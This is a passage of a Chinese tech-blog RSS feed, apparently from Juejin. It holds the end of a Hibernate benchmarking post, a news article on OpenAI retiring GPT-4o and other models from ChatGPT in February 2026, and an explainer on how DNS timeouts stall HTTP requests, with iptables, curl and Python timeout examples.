<p>通过以上配置和代码示例，我们展示了如何在性能测试中使用Hibernate。这包括如何配置Hibernate、定义实体类、使用JMH进行性能基准测试、编写数据种子、以及如何运行和分析性能测试结果。此流程帮助你识别和解决与数据库访问相关的性能瓶颈，确保在实际应用中数据库操作的高效性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GPT-4o 终于要“下线”了]]></title>    <link>https://juejin.cn/post/7603186080494272563</link>    <guid>https://juejin.cn/post/7603186080494272563</guid>    <pubDate>2026-02-05T14:53:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603186080494272563" data-draft-id="7603185231802269722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GPT-4o 终于要“下线”了"/> <meta itemprop="keywords" content="ChatGPT,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T14:53:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Dcs"/> <meta itemprop="url" content="https://juejin.cn/user/3679404422861902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GPT-4o 终于要“下线”了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3679404422861902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Dcs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:53:13.000Z" title="Thu Feb 05 2026 14:53:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>OpenAI 在 <strong>2026 年 1 月 29 日</strong>发了一则产品公告：</p>
<p><strong>2026 年 2 月 13 日</strong>起，ChatGPT 会正式下线一批老模型——<strong>GPT-4o、GPT-4.1、GPT-4.1 mini、OpenAI o4-mini</strong>；在这一天下线的还有<strong>之前宣布的 GPT-5（Instant 和 Thinking）</strong>。</p>
<p>还有一点：<strong>API 目前不变</strong>，这次主要影响的是 <em>ChatGPT 内可选模型</em>。</p>
<p>很多人看到“GPT-4o 要下线”第一反应是：</p>
<p>“完了，我常用的那股‘更会聊天、更有温度’的味儿是不是没了？”</p>
<p>别急，公告里其实把原因说得挺直白：<strong>GPT-4o 这事有特殊背景</strong>，而且 OpenAI 团队也承认，之前“先下架、后又恢复”就是因为用户反馈太强烈。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff75838ed8674fdabc7d7182ee716da7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=WH8NliJDeedeGyRwFPRQ929%2B7U4%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">1）这次到底下哪些？</h2>
<ul>
<li><strong>下线时间</strong>：<strong>2026-02-13</strong></li>
<li><strong>ChatGPT 内下线模型</strong>：GPT-4o / GPT-4.1 / GPT-4.1 mini / OpenAI o4-mini</li>
<li><strong>API</strong>：公告明确说 <strong>“at this time no changes”</strong>（至少目前不动）</li>
</ul>
<p>总而言之：</p>
<blockquote>
<p>ChatGPT 这个“前台下拉框”里要做一次断舍离，但“ API ”暂时没改。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">2）为什么 GPT-4o 还要单独拉出来讲？</h2>
<p>公告里给 GPT-4o 这段写得很像“产品复盘”：</p>
<ul>
<li>GPT-4o 之前被弃用过</li>
<li>GPT-5 发布期间又恢复过</li>
<li>恢复的原因是：<strong>一部分 Plus/Pro 用户反馈迁移不及</strong>，尤其是<strong>创意构思（creative ideation）<strong>这类场景；同时也更喜欢 GPT-4o 的</strong>对话风格和温暖感</strong></li>
</ul>
<p>说人话就是：
<strong>有些人不是追“最强”，而是追“最顺手、最像个靠谱同事”。</strong></p>
<hr/>
<h2 data-id="heading-2">3）GPT-5.1 / GPT-5.2 把 4o 的优点吸收了</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abec1b53ac574e278786452756c5ec0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=pEAC%2FK%2FZTX0mVGgqF4n7Clt3Jiw%3D" alt="image.png" loading="lazy"/></p>
<p>官方说用户对 GPT-4o 的反馈，直接影响了 <strong>GPT-5.1 和 GPT-5.2</strong> 的方向，重点包括：</p>
<ul>
<li><strong>人格/语气（personality）更好</strong></li>
<li><strong>更强的创意支持</strong></li>
<li><strong>更多可自定义的回复方式</strong>（比如 base styles、tones，甚至可以调“温暖/热情”这类参数）</li>
</ul>
<p>这里其实透露了一个产品趋势：</p>
<p>以后模型能力是一部分，但“你想让它怎么说话”会变成另一条主线。对内容创作者、产品经理、以及需要写沟通文案的开发者来说，这个变化挺关键——<strong>风格可控，才更像工具，而不是靠赌。</strong></p>
<hr/>
<h2 data-id="heading-3">4）为什么现在宣布？</h2>
<p>公告里给了一个“看起来很冷冰冰但很有说服力”（我认为说服不了我[机智]）的数据：</p>
<blockquote>
<p>绝大多数使用已经转到 GPT-5.2，每天只有 <strong>0.1%</strong> 用户还在选 GPT-4o。</p>
</blockquote>
<p>这就解释了“为什么敢下”：
当一个选项只剩极少数人用，继续维护它的成本（工程、测试、体验一致性）就会越来越不划算。</p>
<h2 data-id="heading-4">5）对普通用户/开发者，最实用的迁移思路是什么？</h2>
<h3 data-id="heading-5">日常用户（写作、头脑风暴、对话陪跑）</h3>
<ul>
<li>目标不是“找替代品”，而是<strong>把 GPT-5.2 的风格调成你熟悉的手感</strong></li>
<li>优先试：<strong>Friendly</strong> 这类 base style，然后再按需加“warmth / enthusiasm”方向的控制</li>
</ul>
<h3 data-id="heading-6">专业用户（写需求、写方案、写代码、做结构化输出）</h3>
<ul>
<li>
<p>把“模型选择”换成“可复现配置”：</p>
<ul>
<li>固定 base style / tone</li>
<li>固定输出格式（标题层级、要点数量、表格/清单规则）</li>
<li>固定错误处理方式（不确定就说不知道）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">团队/流程（把 ChatGPT 作为生产力的一环）</h3>
<ul>
<li>
<p>做一张“迁移检查清单”最省心：</p>
<ol>
<li>你们最依赖 GPT-4o 的 5 个场景是什么（比如创意文案、PRD、代码 review、用户回复、脑暴）</li>
<li>每个场景写 3 条“验收标准”（比如语气、结构、长度、是否给步骤）</li>
<li>用 GPT-5.2 跑一遍，把差异记录成可调参数（风格、提示词模板、输出约束）</li>
</ol>
</li>
</ul>
<hr/>
<h2 data-id="heading-8">6）结语</h2>
<p>OpenAI 团队接下来会继续优化：</p>
<ul>
<li><strong>人格与创造力</strong>进一步提升</li>
<li><strong>减少不必要的拒绝</strong>、以及那种“过度谨慎/说教式”的回答（更新“coming soon”）</li>
</ul>
<p>另外还有一条比较“产品化”的动作：他们说为了支持更多选择与自由，已经在多数市场对 <strong>18 岁以下用户</strong>上线了 <strong>age prediction</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34ee0d1f2cc3427990c1dfaeeaa78702~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=NBwkhQG%2FQajwuG%2Fut86gjXnFC%2B8%3D" alt="image.png" loading="lazy"/></p>
<p>如果你就是那 0.1%，也不用和官方硬刚</p>
<p>GPT-4o 的“温度”确实是很多人喜欢它的原因，但从公告看，OpenAI 团队的态度是：
<strong>把这份偏好迁移到可调节的体验层</strong>，而不是继续保留一堆旧模型让产品越来越难维护。</p>
<p>你真正要保住的，不是“4o 这个名字”，而是你工作流里那套：
<strong>提示词模板 + 风格配置 + 输出标准</strong>。把它搬到 GPT-5.2 上，你会更稳。</p>
<hr/>
<p><strong>喜欢就奖励一个“👍”和“在看”呗~</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/662768799f9f462d93846e01ae6d282c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGNz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907992&amp;x-signature=1tCq7s%2B2M4N%2BPHH6%2BtWOwM9N%2FDk%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”]]></title>    <link>https://juejin.cn/post/7603195960254971904</link>    <guid>https://juejin.cn/post/7603195960254971904</guid>    <pubDate>2026-02-05T15:00:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254971904" data-draft-id="7603183929252266036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2026-02-05T15:00:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:00:35.000Z" title="Thu Feb 05 2026 15:00:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这是一个非常关键且常见的网络性能问题。下面我将从 <strong>HTTP 请求生命周期</strong> 和 <strong>DNS 解析机制</strong> 两个维度，深入分析 <strong>为什么 DNS 解析失败或缓慢会导致整个 HTTP 请求“卡在初始阶段”</strong> 。</p>
<hr/>
<h2 data-id="heading-0">一、HTTP 请求的完整流程（简化版）</h2>
<p>一个典型的 HTTP(S) 请求包含以下关键步骤：</p>
<pre><code class="hljs language-arduino" lang="arduino">sequenceDiagram
    participant <span class="hljs-built_in">Client</span> as 客户端
    participant DNS as DNS 服务器
    participant <span class="hljs-built_in">Server</span> as 目标服务器

    <span class="hljs-built_in">Client</span>-&gt;&gt;DNS: <span class="hljs-number">1.</span> DNS 查询 (example.com → IP?)
    DNS--&gt;&gt;<span class="hljs-built_in">Client</span>: <span class="hljs-number">2.</span> 返回 IP 地址 (如 <span class="hljs-number">93.184</span><span class="hljs-number">.216</span><span class="hljs-number">.34</span>)
    <span class="hljs-built_in">Client</span>-&gt;&gt;<span class="hljs-built_in">Server</span>: <span class="hljs-number">3.</span> 建立 TCP 连接 (SYN, SYN-ACK, ACK)
    <span class="hljs-built_in">Client</span>-&gt;&gt;<span class="hljs-built_in">Server</span>: <span class="hljs-number">4.</span> 发送 HTTP 请求
    <span class="hljs-built_in">Server</span>--&gt;&gt;<span class="hljs-built_in">Client</span>: <span class="hljs-number">5.</span> 返回 HTTP 响应
</code></pre>
<blockquote>
<p>✅ <strong>关键点</strong>：<strong>DNS 解析是 HTTP 请求的第一步，且是阻塞式操作</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、为什么 DNS 是“卡住”的罪魁祸首？</h2>
<h3 data-id="heading-2">1. <strong>DNS 解析发生在应用层之前</strong></h3>
<ul>
<li>当你在浏览器输入 <code>https://example.com</code> 或程序调用 <code>requests.get("https://api.example.com")</code> 时，</li>
<li>底层库（如 Python 的 <code>socket.getaddrinfo()</code>）会<strong>先解析域名</strong>，<strong>再建立连接</strong>。</li>
<li><strong>如果 DNS 没返回 IP，TCP 连接根本无法发起</strong>。</li>
</ul>
<blockquote>
<p>📌 <strong>结论</strong>：DNS 是“前置依赖”，不完成则后续步骤无法启动。</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">2. <strong>默认 DNS 超时时间很长</strong></h3>
<p>不同系统的默认 DNS 超时策略：</p>

























<table><thead><tr><th>环境</th><th>默认超时行为</th></tr></thead><tbody><tr><td><strong>Linux glibc</strong></td><td>尝试多个 DNS 服务器，总超时可达 <strong>15~30 秒</strong></td></tr><tr><td><strong>Python requests</strong></td><td>无独立 DNS 超时，继承系统行为</td></tr><tr><td><strong>cURL</strong></td><td>默认 DNS 超时约 <strong>30 秒</strong></td></tr><tr><td><strong>浏览器（Chrome）</strong></td><td>通常 10~60 秒（含重试）</td></tr></tbody></table>
<blockquote>
<p>⚠️ 示例：<br/>
如果你的 <code>/etc/resolv.conf</code> 配置了两个 DNS 服务器，第一个无响应，第二个有效，<br/>
系统可能先等第一个超时（5秒）→ 再试第二个（成功），<strong>总耗时 5+ 秒</strong>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">3. <strong>DNS 失败 ≠ 快速失败</strong></h3>
<ul>
<li><strong>DNS 服务器无响应</strong>（丢包、防火墙拦截）→ 触发重试 + 超时 → <strong>长时间卡住</strong></li>
<li><strong>DNS 返回 NXDOMAIN</strong>（域名不存在）→ <strong>快速失败</strong>（毫秒级）</li>
<li><strong>DNS 返回错误 IP</strong> → 后续 TCP 连接失败，但<strong>DNS 阶段本身很快</strong></li>
</ul>
<blockquote>
<p>🔍 所以，“卡住”通常是因为 <strong>DNS 服务器无响应</strong>，而非域名不存在。</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">三、技术底层：操作系统如何处理 DNS？</h2>
<p>以 Linux 为例：</p>
<ol>
<li>应用调用 <code>getaddrinfo("example.com", ...)</code></li>
<li>C 库（glibc）读取 <code>/etc/nsswitch.conf</code> → 使用 <code>dns</code> 模块</li>
<li>读取 <code>/etc/resolv.conf</code> 获取 DNS 服务器列表（如 <code>nameserver 8.8.8.8</code>）</li>
<li><strong>向第一个 DNS 服务器发送 UDP 查询</strong>（端口 53）</li>
<li>如果 <strong>5 秒内无响应</strong> → 重试（默认 2 次）→ 切换下一个 DNS 服务器</li>
<li>所有尝试失败后才报错：<code>Temporary failure in name resolution</code></li>
</ol>
<blockquote>
<p>🕒 <strong>最坏情况耗时</strong> = <code>(timeout + retry) × server_count</code><br/>
例如：<code>(5s × 2次) × 2个服务器 = 20秒</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">四、实际现象验证</h2>
<h3 data-id="heading-7">场景：DNS 服务器被屏蔽</h3>
<pre><code class="hljs language-css" lang="css"># 模拟 DNS 无响应（丢弃所有 DNS 包）
sudo iptables -<span class="hljs-selector-tag">A</span> OUTPUT -<span class="hljs-selector-tag">p</span> udp <span class="hljs-attr">--dport</span> <span class="hljs-number">53</span> -j DROP

# 尝试请求
<span class="hljs-selector-tag">time</span> curl -v https://httpbin.org/get
</code></pre>
<p><strong>输出</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">*</span> <span class="hljs-attr">Could not resolve host:</span> <span class="hljs-string">httpbin.org</span>
<span class="hljs-attr">curl:</span> <span class="hljs-string">(6)</span> <span class="hljs-attr">Could not resolve host:</span> <span class="hljs-string">httpbin.org</span>
<span class="hljs-string">real</span>    <span class="hljs-string">0m20.023s</span>  <span class="hljs-string">←</span> <span class="hljs-string">卡了整整</span> <span class="hljs-number">20</span> <span class="hljs-string">秒！</span>
</code></pre>
<blockquote>
<p>💡 注意：错误是 <strong>“Could not resolve host”</strong> ，但耗时极长。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">五、如何避免 DNS 导致的“卡死”？</h2>
<h3 data-id="heading-9">✅ 方案 1：设置合理的 DNS 超时（应用层）</h3>
<h4 data-id="heading-10">Python 示例（使用 <code>socket</code> 设置超时）：</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> requests

<span class="hljs-comment"># 全局设置 DNS + 连接超时（注意：DNS 超时仍受系统限制）</span>
socket.setdefaulttimeout(<span class="hljs-number">5.0</span>)

<span class="hljs-keyword">try</span>:
    resp = requests.get(<span class="hljs-string">"https://example.com"</span>, timeout=<span class="hljs-number">5</span>)
<span class="hljs-keyword">except</span> requests.exceptions.Timeout:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Request timed out"</span>)
</code></pre>
<blockquote>
<p>⚠️ 但注意：<strong><code>socket.setdefaulttimeout()</code> 对 DNS 查询无效！</strong><br/>
因为 DNS 是同步阻塞调用，发生在 <code>connect()</code> 之前。</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">✅ 方案 2：使用支持异步 DNS 的库（推荐）</h3>
<h4 data-id="heading-12">使用 <code>aiohttp</code> + <code>aiodns</code>（异步非阻塞）：</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">import aiohttp
import asyncio

<span class="hljs-keyword">async</span> def <span class="hljs-title">fetch</span>():
    timeout</span> = aiohttp.ClientTimeout(total=<span class="hljs-number">5</span>)
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession(timeout=timeout) <span class="hljs-keyword">as</span> session:
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.<span class="hljs-keyword">get</span>(<span class="hljs-string">'https://example.com'</span>) <span class="hljs-keyword">as</span> resp:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> resp.text()

<span class="hljs-meta"># DNS 解析在事件循环中进行，可被 timeout 中断</span>
asyncio.run(fetch())
</code></pre>
